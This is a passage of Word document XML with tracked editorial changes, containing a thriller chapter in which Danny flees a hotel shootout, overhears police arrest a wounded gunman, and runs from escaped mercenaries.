      <w:del w:id="2895" w:author="TextVet" w:date="2016-03-28T16:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E85823">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> abruptly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He recognized the rectangular shape and rich brown color of the cedar door as it passed by. Danny blinked hard. His eyes hurt with a dull burning ache, like fatigued muscles. The antechamber just outside the Presidential Suite came into focus. He found himself near the elevator.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dark figure set Danny on his feet. Danny steadied himself and looked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saw, looking back into his eyes, the helmet-covered face of Sergey Mukhayev. The armor-clad man pushed Danny toward the door to the emergency stairwell, underneath a glowing red “Exit” sign.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he heard Sergey’s voice — through the helmet, the gunfire, the ringing — yell, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Go!</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At the cedarwood doorway, Leo shouted something in Russian and began backing away from the entrance. Sergey spun back toward the door and swung his MAC-10 toward the entryway. He charged away from Danny, bounding forward behind his </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>shield; the floor seemed to shake with his wide, heavy footfalls. He rushed into the room, fighting against the force of the bullets slamming into his shield.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For the first time in what felt like minutes, Danny took a breath.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suddenly realized that Sergey’s command to him was probably a very good idea.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took one look at the emergency exit door and pushed both palms against its crash bar. The heavy metal barrier whooshed open into the dim, echoing stairwell. He stepped quickly onto the concrete landing and pressed the door shut behind him. The sounds of combat continued outside.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buzzing chatter in his ear had never abated. But after a few seconds in the stairwell, with the fire door muffling the din of battle, the noises coming out of his Bluetooth headset finally began to form coherent speech.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Tina said. “Danny, come in! Please, </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2896" w:author="TextVet" w:date="2016-03-28T16:58:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>please</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> come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here,” he replied. He had to take several seconds just to clear his throat.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“Are you alright?” Tina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Yellow spots still danced before his eyes. His ears still overlaid the world with a high-pitched whine. “I’m honestly not sure.”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spoke on the channel. “Danny, for God’s sake, get your ass out of there. It’s up to Sergey and his guys now. Our part is over.”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took a moment to shake the tension out of his muscles, to clear himself of the fear and bravado. He closed his eyes and watched the blobs of color slowly fade from his sight, and took a few wobbly steps down the stairs. “I’m on my way, Jason. I’ll swing down to the security office to grab my HERF gun, then come meet you aboard your yacht. Be there in a few minutes.”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was barely one flight down when </w:t>
      </w:r>
      <w:del w:id="2897" w:author="TextVet" w:date="2016-03-28T16:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00625C15">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">he heard </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the door crash</w:t>
      </w:r>
      <w:ins w:id="2898" w:author="TextVet" w:date="2016-03-28T16:59:00Z">
        <w:r w:rsidR="00625C15">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> open above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stairwell suddenly filled with the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rat-tat-tat!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of automatic rifle blasts and the dings of casings on concrete. The smooth, unadorned walls conducted the sound down the full height of the building.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Footsteps rushed toward him. Combat boots descended the steps, leaving bloody prints. The helmeted head of Leo the gunman peered down. “What in the hell are you still doing here?” he said. He limped as he walked.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gunshot boomed through the stairwell. A bullet struck Leo’s armor with a sharp smack. He swung his rifle toward the door and fired </w:t>
      </w:r>
      <w:del w:id="2899" w:author="TextVet" w:date="2016-03-28T17:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009F0DC8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">off </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a few rounds.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screamed and fled. Gravity did most of the work for him as he jostled down the stairs. The flights melted into a whizzing blur before his eyes — a kaleidoscope of gray stairs, black railing, water pipes and fire alarms.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Natalie’s voice appeared on the channel. “Danny, there’s two people with guns running to the stairwell.”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“More of Ivan’s men?”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just random hotel guests,” said Natalie. “At least, I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>thought</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> they are. All over the building, everybody’s running away from the stairwell. But these two — one guy and one woman — they whipped out guns and started rushing </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>toward</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the emergency exit. They’re both standing outside the stairwell right now — they’re on either side holding their guns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the fuck?” Danny screeched.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“One’s pulling out something from her pocket,” Natalie added. “It’s black with something shiny attached. The other’s talking on his cellphone in one hand with his gun in the other… Danny, the woman looks like she’s getting ready to body-check the door. The dude’s holding back a few feet, like he’s giving her cover.”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“Jesus. Sounds like they’re pros,” Danny said. “Who the hell </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> they?”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fire door a few levels above burst open. A woman’s voice rang out, “Freeze! Police!”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held his breath.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“Put your weapons on the ground,” she commanded slowly, “and raise your arms! Both of you!”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00A1536F" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2900" w:author="TextVet" w:date="2016-03-28T17:01:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2901" w:author="TextVet" w:date="2016-03-28T17:01:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00A1536F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There were a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> few seconds of stillness</w:t>
      </w:r>
      <w:ins w:id="2902" w:author="TextVet" w:date="2016-03-28T17:01:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2903" w:author="TextVet" w:date="2016-03-28T17:02:00Z">
        <w:r w:rsidR="00A5473A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>followed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Danny gripped the railing tightly, holding every muscle taut, careful to avoid making a sound. He was a few landings below where the police had entered. </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Both of you</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, the woman had said, apparently </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>referring to Leo and his attacker — meaning that they didn’t know Danny was below them. He willed himself to stay statue-like.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above said, “Buddy, I don’t care how big your gun is or how much armor you got on. How far you think you’ll make it on that bum leg?”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gentle tap indicated a gun being placed on the floor, followed by the ratcheting clicks of handcuffs. Then came the distinct static of a two-way radio. The device that Natalie had seen wasn’t a cellphone — it was a walkie-talkie.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“Dispatch, come in,” said the man. “This is Detective Macintyre, with Detective Santello</w:t>
      </w:r>
      <w:ins w:id="2904" w:author="TextVet" w:date="2016-03-29T09:02:00Z">
        <w:r w:rsidR="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2905" w:author="TextVet" w:date="2016-03-29T09:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> plainclothes investigation at </w:t>
      </w:r>
      <w:del w:id="2906" w:author="TextVet" w:date="2016-03-29T09:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Medina Gallante</w:t>
      </w:r>
      <w:del w:id="2907" w:author="TextVet" w:date="2016-03-29T09:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> hotel</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. We </w:t>
      </w:r>
      <w:ins w:id="2908" w:author="TextVet" w:date="2016-03-29T09:01:00Z">
        <w:r w:rsidR="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>found</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2909" w:author="TextVet" w:date="2016-03-29T09:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>picked up</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a company van marked ‘Claymore Communications’ on </w:t>
      </w:r>
      <w:del w:id="2910" w:author="TextVet" w:date="2016-03-29T09:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2911" w:author="TextVet" w:date="2016-03-29T09:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Medina </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>neighborhood</w:t>
      </w:r>
      <w:ins w:id="2912" w:author="TextVet" w:date="2016-03-29T09:02:00Z">
        <w:r w:rsidR="00124092">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 xml:space="preserve"> camera system, </w:t>
      </w:r>
      <w:del w:id="2913" w:author="TextVet" w:date="2016-03-29T09:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00124092">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gave it a routine tail. Dispatch, we’ve got a situation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Leo interrupted. “I… need a bandage.”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need a surgeon, pal,” the cop replied. “But first… You have the right to remain silent. Anything you say can and will be used against you in a court of law…”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Below, Danny resumed descending the stairs, praying that the policeman’s voice would mask the sound of his movements.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soon found himself on the wide </w:t>
      </w:r>
      <w:ins w:id="2914" w:author="TextVet" w:date="2016-03-29T09:05:00Z">
        <w:r w:rsidR="007C79B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ground-</w:t>
        </w:r>
        <w:r w:rsidR="007C79B7" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">floor </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>landing</w:t>
      </w:r>
      <w:del w:id="2915" w:author="TextVet" w:date="2016-03-29T09:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007C79B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the ground floor</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. To his side, the stairs continued downward to the parking garage. Ahead, a fire door stood between him and the maintenance corridor. He opened it gently, and stepped out of the dim stairwell into the fluorescent-lit “HOTEL STAFF ONLY” hallway.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“Cops,” he gasped into the Bluetooth. “Jesus. Tina, this whole building is going to be crawling with law enforcement soon. Tell Sergey and Eugene. They’ll need to be ready for extraction before the cavalry arrives.”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lost them.” Tina said. “Sergey’s connection went dead</w:t>
      </w:r>
      <w:ins w:id="2916" w:author="TextVet" w:date="2016-03-29T09:06:00Z">
        <w:r w:rsidR="0053512B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2917" w:author="TextVet" w:date="2016-03-29T09:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0053512B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Eugene</w:t>
      </w:r>
      <w:ins w:id="2918" w:author="TextVet" w:date="2016-03-29T09:06:00Z">
        <w:r w:rsidR="0053512B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2919" w:author="TextVet" w:date="2016-03-29T09:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0053512B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s still on the channel</w:t>
      </w:r>
      <w:ins w:id="2920" w:author="TextVet" w:date="2016-03-29T09:06:00Z">
        <w:r w:rsidR="0053512B">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but he isn’t responding.”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stared at the door to the stairwell from which he’d just emerged. “We can’t just leave them up there. They have to know about Leo and the cops…”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Jason chimed in. “Danny, you can check </w:t>
      </w:r>
      <w:del w:id="2921" w:author="TextVet" w:date="2016-03-29T09:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0080094F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">up </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on them later. Right now you need to get to safety.”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frowned. “You’re right.” He looked down the drab hallway. “I’ll go grab my HERF gun from the security office and join you on the yacht.”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corridor was silent, save for the faint hum of fluorescent tubes. When he came to the security office, he was greeted by the blissfully familiar sight of his energy weapon charging against the wall.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Inside the room, an odd odor hung in the air: the acrid stink of burnt plastic. It came from the far end of the room, where Eugene had tied up the captives.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trio of towel-clad mercenaries had broken free of Eugene’s knotwork. On the floor, near the stout Latina security guard, lay a cigarette lighter. The three underdressed Russians turned toward Danny and growled.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God damn it,” Danny mumbled, and bolted.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mercenaries gave chase, each self-consciously keeping one hand on the white towel around his waist. Danny sprinted toward the end of the corridor. Like a nightmare, the exit seemed to recede farther with each step. He knew he’d never make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nondescript gray door passed on his side. With the men only a few feet behind him, he grabbed the handle and pushed it open, revealing a small, cramped janitor’s closet. He hurled himself inside and slammed the door behind him. </w:t>
      </w:r>
      <w:ins w:id="2922" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidR="00892940">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>D</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2923" w:author="TextVet" w:date="2016-03-29T09:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00892940">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
